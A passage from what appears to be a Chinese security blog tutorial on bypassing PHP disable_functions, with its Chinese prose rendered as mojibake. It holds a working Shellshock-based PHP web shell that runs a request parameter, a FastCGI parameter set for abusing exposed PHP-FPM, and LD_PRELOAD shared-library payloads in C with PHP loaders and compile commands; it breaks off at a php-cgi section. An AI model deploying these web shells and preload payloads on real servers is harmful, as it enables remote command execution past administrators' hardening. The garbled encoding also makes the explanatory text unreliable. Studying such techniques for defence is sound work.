   if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {
     $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);
     putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;);
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#39;t actually send any mail
   }
   else return &quot;Not vuln (not bash)&quot;;
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != &quot;&quot;) return $output;
   else return &quot;No output, or not vuln.&quot;;
}
echo shellshock($_REQUEST[&quot;cmd&quot;]);
?&gt;</code></pre>
<h2 id="åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´"><a href="#åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´"></a>åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´</h2><h3 id="æ¨èæ–‡ç« "><a href="#æ¨èæ–‡ç« " class="headerlink" title="æ¨èæ–‡ç« "></a>æ¨èæ–‡ç« </h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™</a></p>
<p><a href="https://xz.aliyun.com/t/5598" target="_blank" rel="noopener">æµ…æphp-fpmçš„æ”»å‡»æ–¹å¼</a></p>
<h3 id="ä»€ä¹ˆæ˜¯php-fpm"><a href="#ä»€ä¹ˆæ˜¯php-fpm" class="headerlink" title="ä»€ä¹ˆæ˜¯php-fpm"></a>ä»€ä¹ˆæ˜¯php-fpm</h3><p>php-fpmæ˜¯phpå®˜æ–¹çš„fastcgiè§£æå™¨,Nginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™è°ï¼Ÿå…¶å®å°±æ˜¯ä¼ ç»™FPMã€‚FPMæŒ‰ç…§fastcgiçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚</p>
<p>è¯´åˆ°fastcgi,å°±å¿…é¡»å…ˆè®²ä¸€ä¸‹cgi</p>
<p>cgiçš„å†å²:</p>
<blockquote>
<p>æ—©æœŸçš„webserveråªå¤„ç†htmlç­‰é™æ€æ–‡ä»¶ï¼Œä½†æ˜¯éšç€æŠ€æœ¯çš„å‘å±•ï¼Œå‡ºç°äº†åƒphpç­‰åŠ¨æ€è¯­è¨€ã€‚<br>webserverå¤„ç†ä¸äº†äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿé‚£å°±äº¤ç»™phpè§£é‡Šå™¨æ¥å¤„ç†å§ï¼<br>äº¤ç»™phpè§£é‡Šå™¨å¤„ç†å¾ˆå¥½ï¼Œä½†æ˜¯ï¼Œphpè§£é‡Šå™¨å¦‚ä½•ä¸webserverè¿›è¡Œé€šä¿¡å‘¢ï¼Ÿ<br>ä¸ºäº†è§£å†³ä¸åŒçš„è¯­è¨€è§£é‡Šå™¨(å¦‚phpã€pythonè§£é‡Šå™¨)ä¸webserverçš„é€šä¿¡ï¼Œäºæ˜¯å‡ºç°äº†cgiåè®®ã€‚åªè¦ä½ æŒ‰ç…§cgiåè®®å»ç¼–å†™ç¨‹åºï¼Œå°±èƒ½å®ç°è¯­è¨€è§£é‡Šå™¨ä¸webwerverçš„é€šä¿¡ã€‚å¦‚php-cgiç¨‹åºã€‚</p>
</blockquote>
<p>Fast-CGI:</p>
<p>è™½ç„¶cgiè§£å†³phpè§£é‡Šå™¨ä¸webserverçš„é€šä¿¡é—®é¢˜ï¼Œä½†æ˜¯webserveræ¯æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚å°±ä¼šå»forkä¸€ä¸ªcgiè¿›ç¨‹,è¯·æ±‚ç»“æŸå†killæ‰è¿™ä¸ªè¿›ç¨‹,è¿™æ ·ä¼šå¾ˆæµªè´¹èµ„æº,äºæ˜¯å‡ºç°äº†cgiçš„æ”¹è‰¯ç‰ˆæœ¬ã€‚</p>
<blockquote>
<p>fast-cgiæ¯æ¬¡å¤„ç†å®Œè¯·æ±‚åï¼Œä¸ä¼škillæ‰è¿™ä¸ªè¿›ç¨‹ï¼Œè€Œæ˜¯ä¿ç•™è¿™ä¸ªè¿›ç¨‹ï¼Œä½¿è¿™ä¸ªè¿›ç¨‹å¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚è¿™æ ·æ¯æ¬¡å°±ä¸ç”¨é‡æ–°forkä¸€ä¸ªè¿›ç¨‹äº†ï¼Œå¤§å¤§æé«˜äº†æ•ˆç‡ã€‚</p>
</blockquote>
<p>php-fpm æ˜¯ä¸€ä¸ªFastcgiçš„å®ç°,å¹¶æä¾›è¿›ç¨‹ç®¡ç†åŠŸèƒ½ã€‚</p>
<p>è¿›ç¨‹åŒ…å«äº†masterè¿›ç¨‹å’Œworkerè¿›ç¨‹</p>
<p>masterè¿›ç¨‹åªæœ‰ä¸€ä¸ª,è´Ÿè´£ç›‘å¬ç«¯å£(ä¸€èˆ¬æ˜¯9000)æ¥æ”¶æ¥è‡ªWeb Serverçš„è¯·æ±‚,è€Œworkerè¿›ç¨‹åˆ™ä¸€èˆ¬æœ‰å¤šä¸ª(å…·ä½“æ•°é‡æ ¹æ®å®é™…éœ€è¦é…ç½®),æ¯ä¸ªè¿›ç¨‹å†…éƒ¨éƒ½åµŒå…¥äº†ä¸€ä¸ªphpè§£é‡Šå™¨,æ˜¯phpä»£ç çœŸæ­£æ‰§è¡Œçš„åœ°æ–¹ã€‚</p>
<p>[<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg" alt="image4092"></p>
<p>ä¸Šé¢ç¬¬ä¸€ä¸ªæ˜¯ä¸»è¿›ç¨‹,ä¸‹é¢ä¸¤ä¸ªæ˜¯workerè¿›ç¨‹ã€‚</p>
<h3 id="æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹"><a href="#æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹" class="headerlink" title="æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹"></a>æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹</h3><p>Fastcgiå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚</p>
<p>fastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚</p>
<p>ç±»æ¯”HTTPåè®®æ¥è¯´ï¼Œfastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p>
<p>recordå…·æœ‰å›ºå®šçš„ç»“æ„ã€‚</p>
<pre><code class="c">typedef struct {
  /* Header */
  unsigned char version; // ç‰ˆæœ¬
  unsigned char type; // æœ¬æ¬¡recordçš„ç±»å‹
  unsigned char requestIdB1; // æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // bodyä½“çš„å¤§å°
  unsigned char contentLengthB0;
  unsigned char paddingLength; // é¢å¤–å—å¤§å°
  unsigned char reserved; 

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;</code></pre>
<p>è€Œå…¶ä¸­çš„<code>type</code>å°±æ˜¯æŒ‡å®šè¯¥recordçš„ä½œç”¨ã€‚å› ä¸ºfastcgiä¸€ä¸ªrecordçš„å¤§å°æ˜¯æœ‰é™çš„ï¼Œä½œç”¨ä¹Ÿæ˜¯å•ä¸€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªTCPæµé‡Œä¼ è¾“å¤šä¸ªrecordã€‚é€šè¿‡<code>type</code>æ¥æ ‡å¿—æ¯ä¸ªrecordçš„ä½œç”¨ï¼Œç”¨<code>requestId</code>ä½œä¸ºåŒä¸€æ¬¡è¯·æ±‚çš„idã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡è¯·æ±‚ï¼Œä¼šæœ‰å¤šä¸ªrecordï¼Œä»–ä»¬çš„<code>requestId</code>æ˜¯ç›¸åŒçš„ã€‚</p>
<p>å€Ÿç”¨<a href="http://blog.csdn.net/shreck66/article/details/50355729" target="_blank" rel="noopener">è¯¥æ–‡ç« </a>ä¸­çš„ä¸€ä¸ªè¡¨æ ¼ï¼Œåˆ—å‡ºæœ€ä¸»è¦çš„å‡ ç§<code>type</code>ï¼š</p>
<p><img src="https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png" alt="image5295"></p>
<p>æ ¹æ®è¿™ä¸ªè¡¨æ ¼æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å’Œåç«¯è¯­è¨€é€šä¿¡ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…å°±æ˜¯<code>type</code>ä¸º1çš„recordï¼Œåç»­äº’ç›¸äº¤æµï¼Œå‘é€<code>type</code>ä¸º4ã€5ã€6ã€7çš„recordï¼Œç»“æŸæ—¶å‘é€<code>type</code>ä¸º2ã€3çš„recordã€‚</p>
<p>æˆ‘ä»¬è¦å…³æ³¨çš„é‡ç‚¹å°±æ˜¯type=4çš„éƒ¨åˆ†,ä¹Ÿå°±æ˜¯æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡çš„åœ°æ–¹ã€‚</p>
<p>phpé‡Œæœ‰å¾ˆå¤šæœ‰è¶£çš„è®¾ç½®,åƒæ–‡ä»¶åŒ…å«é‡Œå¸¸ç”¨çš„phpè®¾ç½®<code>auto_prepared_file,auto_append_file</code></p>
<p>æˆ‘ä»¬ä»¤<code>auto_prepared_file=php://input</code>ä¸”<code>allow_url_include=On</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨fastcgiæ¥è®¾ç½®phpçš„ç¯å¢ƒå˜é‡</p>
<p>è¿™åˆæ¶‰åŠåˆ°PHP-FPMçš„ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼Œ<code>PHP_VALUE</code>å’Œ<code>PHP_ADMIN_VALUE</code>ã€‚è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡å°±æ˜¯ç”¨æ¥è®¾ç½®PHPé…ç½®é¡¹çš„ï¼Œ<code>PHP_VALUE</code>å¯ä»¥è®¾ç½®æ¨¡å¼ä¸º<code>PHP_INI_USER</code>å’Œ<code>PHP_INI_ALL</code>çš„é€‰é¡¹ï¼Œ<code>PHP_ADMIN_VALUE</code>å¯ä»¥è®¾ç½®æ‰€æœ‰é€‰é¡¹ã€‚ï¼ˆ<code>disable_functions</code>é™¤å¤–ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯PHPåŠ è½½çš„æ—¶å€™å°±ç¡®å®šäº†ï¼Œåœ¨èŒƒå›´å†…çš„å‡½æ•°ç›´æ¥ä¸ä¼šè¢«åŠ è½½åˆ°PHPä¸Šä¸‹æ–‡ä¸­ï¼‰</p>
<p>ç»“æ„ä½“å®ä¾‹:</p>
<pre><code class="php">array(
        &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
        &#39;REQUEST_METHOD&#39; =&gt; &#39;POST&#39;,
        &#39;SCRIPT_FILENAME&#39; =&gt; &#39;/var/www/html/index.php&#39;,
        &#39;SERVER_SOFTWARE&#39; =&gt; &#39;php/fcgiclient&#39;,
        &#39;REMOTE_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,
        &#39;REMOTE_PORT&#39; =&gt; &#39;9985&#39;,
        &#39;SERVER_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,
        &#39;SERVER_PORT&#39; =&gt; &#39;80&#39;,
        &#39;SERVER_NAME&#39; =&gt; &#39;mag-tured&#39;,
        &#39;SERVER_PROTOCOL&#39; =&gt; &#39;HTTP/1.1&#39;,
        &#39;CONTENT_TYPE&#39; =&gt; &#39;application/x-www-form-urlencoded&#39;,
        &#39;CONTENT_LENGTH&#39; =&gt; strlen($content),
        &#39;PHP_VALUE&#39; =&gt;&#39;auto_append_file=php://input&#39;,
        &#39;PHP_ADMIN_VALUE&#39;=&gt;&#39;allow_url_include=On&#39;
    )</code></pre>
<h3 id="åŸç†æµ…æ"><a href="#åŸç†æµ…æ" class="headerlink" title="åŸç†æµ…æ"></a>åŸç†æµ…æ</h3><p>è¿™ä¸ªåŸç†çš„æ¼æ´åŸå› æ˜¯PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´,php-fpmæ²¡æœ‰å¯¹å‘é€æ•°æ®çš„æ¥æºè¿›è¡ŒéªŒè¯,å¯¼è‡´åªè¦æˆ‘ä»¬å‘php-fpmå‘é€ç¬¦åˆæ ¼å¼çš„æ•°æ®å°±å¯ä»¥è¢«è§£æ.å†ç»“åˆfastcgiè®¾ç½®ç¯å¢ƒå˜é‡çš„éƒ¨åˆ†æ¥è¾¾åˆ°getshell</p>
<h3 id="fpmåˆ©ç”¨è„šæœ¬"><a href="#fpmåˆ©ç”¨è„šæœ¬" class="headerlink" title="fpmåˆ©ç”¨è„šæœ¬"></a>fpmåˆ©ç”¨è„šæœ¬</h3><p>åˆ†äº«ä¸ªpç‰›è„šæœ¬é‡Œé¢çš„ä¸€ä¸ªclientå®¢æˆ·ç«¯: <a href="https://github.com/wuyunfeng/Python-FastCGI-Client" target="_blank" rel="noopener">Python FastCGI Client</a><br>è¿˜æœ‰Lz1yå¸ˆå‚…ç»™çš„ä¸€ä¸ªphpå®¢æˆ·ç«¯ <a href="https://github.com/adoy/PHP-FastCGI-Client.git" target="_blank" rel="noopener">PHP FastCGI Client</a></p>
<p>è¿˜è¦phpè¯­è¨€å®¢æˆ·ç«¯: <a href="http://nullget.sourceforge.net/?q=node/795&lang=zh-hans" target="_blank" rel="noopener">fastcgiå®¢æˆ·ç«¯PHPè¯­è¨€å®ç°</a></p>
<h2 id="LD-PRELOADç»•è¿‡"><a href="#LD-PRELOADç»•è¿‡" class="headerlink" title="LD_PRELOADç»•è¿‡"></a>LD_PRELOADç»•è¿‡</h2><h3 id="send-mail"><a href="#send-mail" class="headerlink" title="send_mail"></a>send_mail</h3><p>è¿™é‡Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹åŸç†ï¼Œé¦–å…ˆä»€ä¹ˆæ˜¯LD_PRELOADï¼Ÿ</p>
<p>googleç»™å‡ºå¦‚ä¸‹å®šä¹‰</p>
<pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>å³LD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼Œä¼šåœ¨å…¶ä»–æ–‡ä»¶è¢«è°ƒç”¨å‰ï¼Œæœ€å…ˆè¢«è°ƒç”¨</p>
<p>è€Œputenvå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡</p>
<pre><code class="php">putenv ( string $setting ) : bool</code></pre>
<p>æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸‹éªšæ“ä½œ</p>
<blockquote>
<p>1.åˆ¶ä½œä¸€ä¸ªæ¶æ„shared libraries<br>2.ä½¿ç”¨putenvè®¾ç½®LD_PRELOADä¸ºæ¶æ„æ–‡ä»¶è·¯å¾„<br>3.ä½¿ç”¨æŸä¸ªphpå‡½æ•°ï¼Œè§¦å‘specific shared library</p>
</blockquote>
<h4 id="åˆ©ç”¨å‡½æ•°"><a href="#åˆ©ç”¨å‡½æ•°" class="headerlink" title="åˆ©ç”¨å‡½æ•°"></a>åˆ©ç”¨å‡½æ•°</h4><p><code>putenv,errorlog,mail</code></p>
<h4 id="å¦‚ä½•åˆ¶ä½œshared-libraries"><a href="#å¦‚ä½•åˆ¶ä½œshared-libraries" class="headerlink" title="å¦‚ä½•åˆ¶ä½œshared libraries"></a>å¦‚ä½•åˆ¶ä½œshared libraries</h4><p>é€‰æ‹©è¦æ›¿æ¢çš„å‡½æ•°æˆ‘ä»¬è¿™é‡Œé€‰å–geteuid()</p>
<p>ç†ç”±æ˜¯phpçš„mail()å‡½æ•°ä¼šè°ƒç”¨ç³»ç»Ÿçš„sendmailå‘½ä»¤è€Œsendmailå‘½ä»¤ä¼šè°ƒç”¨getuid()è¿™ä¸ªå‡½æ•°,æ‰€ä»¥æˆ‘ä»¬ç¡®å®šç›®æ ‡ä¸ºgeteuidå‡½æ•°</p>
<pre><code class="c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload() {
    system(&quot;ls &gt; result.txt&quot;);
    }
    int  geteuid() {
    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) 
    { return 0; }
    unsetenv(&quot;LD_PRELOAD&quot;);
    payload();
      }</code></pre>
<p>å½“è¿™ä¸ªå…±äº«åº“ä¸­çš„ <code>geteuid</code> è¢«è°ƒç”¨æ—¶ï¼Œå°è¯•åŠ è½½ <code>payload()</code> å‡½æ•°ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚è¿™ä¸ªæµ‹è¯•å‡½æ•°å†™çš„å¾ˆç®€å•ï¼Œå®é™…åº”ç”¨æ—¶å¯ç›¸åº”è°ƒæ•´å®Œå–„ã€‚åœ¨æ”»å‡»æœºä¸Šï¼ˆæ³¨æ„ç¼–è¯‘å¹³å°åº”å’Œé¶æœºå¹³å°ç›¸è¿‘ï¼Œè‡³å°‘ä¸èƒ½ä¸€ä¸ªæ˜¯ 32 ä½ä¸€ä¸ªæ˜¯ 64 ä½ï¼‰æŠŠå®ƒç¼–è¯‘ä¸ºä¸€ä¸ªä½ç½®ä¿¡æ¯æ— å…³çš„åŠ¨æ€å…±äº«åº“ï¼š</p>
<pre><code>gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so</code></pre><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>å°†æ¶æ„çš„.soæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨</p>
<p>æ‰§è¡Œå¦‚ä¸‹ä»£ç ,å³å¯è½½å…¥æ¶æ„å‘½ä»¤</p>
<pre><code class="php">&lt;?php
putenv(&quot;LD_PRELOAD=/var/www/hack.so&quot;);
mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
?&gt;</code></pre>
<h4 id="ç›¸å…³æ–‡ç« "><a href="#ç›¸å…³æ–‡ç« " class="headerlink" title="ç›¸å…³æ–‡ç« "></a>ç›¸å…³æ–‡ç« </h4><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
<p>[<a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]</a>(<a href="https://www.k0rz3n.com/2019/02/12/PHP" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP</a> ä¸­å¯ä»¥åˆ©ç”¨çš„å±é™©çš„å‡½æ•°/#8-mail-ç¬¬äº”ä¸ªå‚æ•°-excrt-cmd)</p>
<p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p>
<h3 id="without-sendmail"><a href="#without-sendmail" class="headerlink" title="without sendmail"></a>without sendmail</h3><p> <a href="https://www.mi1k7ea.com/2019/06/02/æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•/#Method2â€”â€”åŠ«æŒå¯åŠ¨è¿›ç¨‹" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a> </p>
<blockquote>
<p>å›åˆ° LD_PRELOAD æœ¬èº«ï¼Œç³»ç»Ÿé€šè¿‡å®ƒé¢„å…ˆåŠ è½½å…±äº«å¯¹è±¡ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼ï¼Œåœ¨åŠ è½½æ—¶å°±æ‰§è¡Œä»£ç ï¼Œè€Œä¸ç”¨è€ƒè™‘åŠ«æŒæŸä¸€ç³»ç»Ÿå‡½æ•°ï¼Œé‚£æˆ‘å°±å®Œå…¨å¯ä»¥ä¸ä¾èµ– sendmail äº†ã€‚è¿™ç§åœºæ™¯ä¸ C++ çš„æ„é€ å‡½æ•°ç®€ç›´ç¥ä¼¼ï¼</p>
<p>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>__attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code> ä¿®é¥°çš„å‡½æ•°ã€‚è¿™ä¸€ç»†èŠ‚éå¸¸é‡è¦ï¼Œå¾ˆå¤šæœ‹å‹ç”¨ LD_PRELOAD æ‰‹æ³•çªç ´ disable_functions æ— æ³•åšåˆ°ç™¾åˆ†ç™¾æˆåŠŸï¼Œæ­£å› ä¸ºè¿™ä¸ªåŸå› ï¼Œ<strong>ä¸è¦å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘æ‹¦åŠ«å¯åŠ¨è¿›ç¨‹è¿™ä¸€è¡Œä¸º</strong>ã€‚</p>
<p>æ­¤å¤–ï¼Œæˆ‘é€šè¿‡ LD_PRELOAD åŠ«æŒäº†å¯åŠ¨è¿›ç¨‹çš„è¡Œä¸ºï¼ŒåŠ«æŒååˆå¯åŠ¨äº†å¦å¤–çš„æ–°è¿›ç¨‹ï¼Œè‹¥ä¸åœ¨æ–°è¿›ç¨‹å¯åŠ¨å‰å–æ¶ˆ LD_PRELOADï¼Œåˆ™å°†é™·å…¥æ— é™å¾ªç¯ï¼Œæ‰€ä»¥å¿…é¡»å¾—åˆ é™¤ç¯å¢ƒå˜é‡ LD_PRELOADã€‚æœ€ç›´è§‚çš„åšæ³•æ˜¯è°ƒç”¨ <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>ï¼Œè¿™åœ¨å¤§éƒ¨ä»½ linux å‘è¡Œå¥—ä»¶ä¸Šçš„ç¡®å¯è¡Œï¼Œä½†åœ¨ centos ä¸Šå´æ— æ•ˆï¼Œç©¶å…¶åŸå› ï¼Œcentos è‡ªå·±ä¹Ÿ hook äº† unsetenv()ï¼Œåœ¨å…¶å†…éƒ¨å¯åŠ¨äº†å…¶ä»–è¿›ç¨‹ï¼Œæ ¹æœ¬æ¥ä¸åŠåˆ é™¤ LD_PRELOAD å°±åˆè¢«åŠ«æŒï¼Œå¯¼è‡´æ— é™å¾ªç¯ã€‚æ‰€ä»¥ï¼Œæˆ‘å¾—æ‰¾ä¸€ç§æ¯” unsetenv() æ›´ç›´æ¥çš„åˆ é™¤ç¯å¢ƒå˜é‡çš„æ–¹å¼ã€‚æ˜¯å®ƒï¼Œå…¨å±€å˜é‡ <code>extern char** environ</code>ï¼å®é™…ä¸Šï¼Œunsetenv() å°±æ˜¯å¯¹ environ çš„ç®€å•å°è£…å®ç°çš„ç¯å¢ƒå˜é‡åˆ é™¤åŠŸèƒ½ã€‚</p>
</blockquote>
<h4 id="ç”±äºopen-basedir-webç›®å½•ä¸å¯å†™ç»•è¿‡"><a href="#ç”±äºopen-basedir-webç›®å½•ä¸å¯å†™ç»•è¿‡" class="headerlink" title="ç”±äºopen_basedir+webç›®å½•ä¸å¯å†™ç»•è¿‡"></a>ç”±äºopen_basedir+webç›®å½•ä¸å¯å†™ç»•è¿‡</h4><p>è§ bypass open_basedir çš„ tmpfileéƒ¨åˆ†</p>
<h4 id="æ”»å‡»åˆ©ç”¨"><a href="#æ”»å‡»åˆ©ç”¨" class="headerlink" title="æ”»å‡»åˆ©ç”¨"></a>æ”»å‡»åˆ©ç”¨</h4><p>bypass_disablefunc.c</p>
<pre><code>#define _GNU_SOURCE

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);

    // unset environment variable LD_PRELOAD.
    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) {
                    environ[i][0] = &#39;\0&#39;;
            }
    }

    // executive command
    system(cmdline);
}</code></pre><p>æ¥ç€ç”¨ä»¥ä¸‹è¯­å¥ç¼–è¯‘Cæ–‡ä»¶ä¸ºå…±äº«å¯¹è±¡æ–‡ä»¶ï¼š</p>
<pre><code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</code></pre><p>bypass_disablefunc.phpï¼Œä»£ç å’Œtest.phpä¸€è‡´ï¼š</p>
<pre><code class="php">&lt;?php
    $cmd = &quot;ls&quot;;
    $out_path = &quot;/tmp/cmdout&quot;;
    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;
    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;
    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);
    $so_path = &quot;/var/www/html/bypass_disablefunc.so&quot;;
    putenv(&quot;LD_PRELOAD=&quot; . $so_path);
    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);
    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; 
    unlink($out_path);
?&gt;</code></pre>
<h2 id="apache-php-cgi-modæ”»å‡»"><a href="#apache-php-cgi-modæ”»å‡»" class="headerlink" title="apache+php cgi modæ”»å‡»"></a>apache+php cgi modæ”»å‡»</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>phpä½œä¸ºcgiæ¨¡å¼è¿è¡Œçš„æ—¶å€™ï¼Œæ¥å—-s  -d -c è¿™æ ·çš„å‚æ•°ï¼Œæˆ‘ä»¬çœ‹çœ‹è¿™äº›å‚æ•°çš„åŠŸèƒ½</p>
